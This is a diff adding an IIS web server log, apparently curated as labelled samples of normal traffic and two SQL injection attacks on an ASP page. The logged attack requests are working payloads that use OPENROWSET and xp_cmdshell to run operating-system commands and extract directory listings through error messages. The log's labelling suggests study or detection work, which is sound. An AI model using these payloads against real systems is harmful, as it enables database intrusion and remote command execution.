@@ -1,0 +1,130 @@
+#Normal ##########################################################################################
+
+2007-10-08 19:50:38 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId=2277 200 4365 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:38 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId=2276 200 456 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:38 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp showdetails=true&idSuper=0&browse=ptype&showprods=true&Type=38&idCategory=69&idProduct=1859;declare%20@a-- 200 4365 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM
+
+
+
+#Ataque  #1 Inicio ##########################################################################################
+
+2007-10-08 19:50:38 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2B(select%201%20from%20OPENROWSET('MSDASQL'%2C'DRIVER%3D%7BSQL%20Server%7D%3BSERVER%3D%3B'%2C'select%201%3Bexec%20xp_cmdshell%20''osql%20-E%20-Q%20%22CREATE%20TABLE%20OSDE_NEO_V3..TMP_TMP%20(id%20int%20identity(1%2C1)%2Ccmd%20varchar(8000))%22''%3B'))%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:39 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2B(select%201%20from%20OPENROWSET('MSDASQL'%2C'DRIVER%3D%7BSQL%20Server%7D%3BSERVER%3D%3B'%2C'select%201%3Binsert%20OSDE_NEO_V3..TMP_TMP%20exec%20xp_cmdshell%20''dir%20c%3A%5C'''))%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:40 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20convert(varchar%2Ccount(*))%20from%20OSDE_NEO_V3..TMP_TMP)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]22'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:40 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D1)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_Volume_in_drive_C_is_SYSTEM'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:42 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D2)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_Volume_Serial_Number_is_24CA-C152'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:43 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D3)%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:44 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D4)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_Directory_of_c:\'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:45 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D5)%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:45 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D6)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]04/08/2007__07:23p_____________428.544_1315.exe'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:46 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D7)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]21/07/2006__04:59p______<DIR>__________ca_lic'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:46 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D8)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]22/01/2007__06:26p______<DIR>__________Documents_and_Settings'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:48 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D9)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]04/08/2007__07:10p_______________1.087_down.vbs'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:48 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D10)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]14/07/2006__09:12p______<DIR>__________drv'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:49 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D11)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]30/08/2006__11:46a______<DIR>__________Inetpub'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:49 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D12)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]31/05/2007__06:29p______<DIR>__________Marcelo'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:50 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D13)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]18/09/2007__01:06p______<DIR>__________Program_Files'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:50 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D14)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]19/07/2006__12:55p______<DIR>__________sql2ksp3'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:51 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D15)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]26/07/2006__11:01a______<DIR>__________TEMP'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:51 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D16)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]01/09/2007__07:55p______<DIR>__________WINNT'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:52 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D17)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]21/07/2006__03:26p_________________302_WINNTAgent.LOG'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:52 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D18)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]08/10/2007__04:53p_____________645.792_zabbix_agentd.log'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:54 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D19)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]01/10/2007__11:24p___________1.048.651_zabbix_agentd.log.old'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:54 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D20)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_______________5_File(s)______2.124.376_bytes'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:55 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D21)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_______________9_Dir(s)___3.664.987.648_bytes_free'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:56 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D22)%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:50:57 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2B(select%201%20from%20OPENROWSET('MSDASQL'%2C'DRIVER%3D%7BSQL%20Server%7D%3BSERVER%3D%3B'%2C'select%201%3Bexec%20xp_cmdshell%20''osql%20-E%20-Q%20%22DROP%20TABLE%20OSDE_NEO_V3..TMP_TMP%22''%3B'))%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+#Ataque #1 Finalizado ##########################################################################################
+
+#Ataque #2 Inicio ##########################################################################################
+
+2007-10-08 19:55:27 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2B(select%201%20from%20OPENROWSET('MSDASQL'%2C'DRIVER%3D%7BSQL%20Server%7D%3BSERVER%3D%3B'%2C'select%201%3Bexec%20xp_cmdshell%20''osql%20-E%20-Q%20%22CREATE%20TABLE%20OSDE_NEO_V3..TMP_TMP%20(id%20int%20identity(1%2C1)%2Ccmd%20varchar(8000))%22''%3B'))%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:39 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2B(select%201%20from%20OPENROWSET('MSDASQL'%2C'DRIVER%3D%7BSQL%20Server%7D%3BSERVER%3D%3B'%2C'select%201%3Binsert%20OSDE_NEO_V3..TMP_TMP%20exec%20xp_cmdshell%20''dir%20c%3A%5C'''))%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:40 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20convert(varchar%2Ccount(*))%20from%20OSDE_NEO_V3..TMP_TMP)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]22'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:40 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D1)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_Volume_in_drive_C_is_SYSTEM'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:42 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D2)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_Volume_Serial_Number_is_24CA-C152'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:43 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D3)%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:44 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D4)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_Directory_of_c:\'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:45 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D5)%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:45 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D6)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]04/08/2007__07:23p_____________428.544_1315.exe'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:46 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D7)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]21/07/2006__04:59p______<DIR>__________ca_lic'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:46 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D8)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]22/01/2007__06:26p______<DIR>__________Documents_and_Settings'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:48 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D9)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]04/08/2007__07:10p_______________1.087_down.vbs'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:48 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D10)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]14/07/2006__09:12p______<DIR>__________drv'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:49 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D11)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]30/08/2006__11:46a______<DIR>__________Inetpub'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:49 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D12)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]31/05/2007__06:29p______<DIR>__________Marcelo'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:50 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D13)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]18/09/2007__01:06p______<DIR>__________Program_Files'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:50 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D14)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]19/07/2006__12:55p______<DIR>__________sql2ksp3'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:51 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D15)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]26/07/2006__11:01a______<DIR>__________TEMP'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:51 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D16)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]01/09/2007__07:55p______<DIR>__________WINNT'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:52 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D17)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]21/07/2006__03:26p_________________302_WINNTAgent.LOG'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:52 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D18)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]08/10/2007__04:53p_____________645.792_zabbix_agentd.log'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:54 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D19)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]01/10/2007__11:24p___________1.048.651_zabbix_agentd.log.old'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:54 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D20)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_______________5_File(s)______2.124.376_bytes'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:55 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D21)%2B'|36|80040e07|Syntax_error_converting_the_varchar_value_'{]_______________9_Dir(s)___3.664.987.648_bytes_free'_to_a_column_of_data_type_int. 500 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:56 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2Bconvert(varchar%2C0x7b5d)%2B(select%20cmd%20from%20OSDE_NEO_V3..TMP_TMP%20where%20id%3D22)%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+2007-10-08 19:55:57 201.213.9.254 - 192.168.204.25 80 GET /estructura_detalle_neo_data.asp intId='%2B(select%201%20from%20OPENROWSET('MSDASQL'%2C'DRIVER%3D%7BSQL%20Server%7D%3BSERVER%3D%3B'%2C'select%201%3Bexec%20xp_cmdshell%20''osql%20-E%20-Q%20%22DROP%20TABLE%20OSDE_NEO_V3..TMP_TMP%22''%3B'))%2B' 200 0 Mozilla/4.0+(compatible;+MSIE+5.5;+Windows+98;+DigExt) ASPSESSIONIDAQBTTDBB=BMGHIJLAOKOBNBKPEHKACCLM -
+
+#Ataque #2 Finalizado ##########################################################################################
+
+
+#Normal ##########################################################################################
+
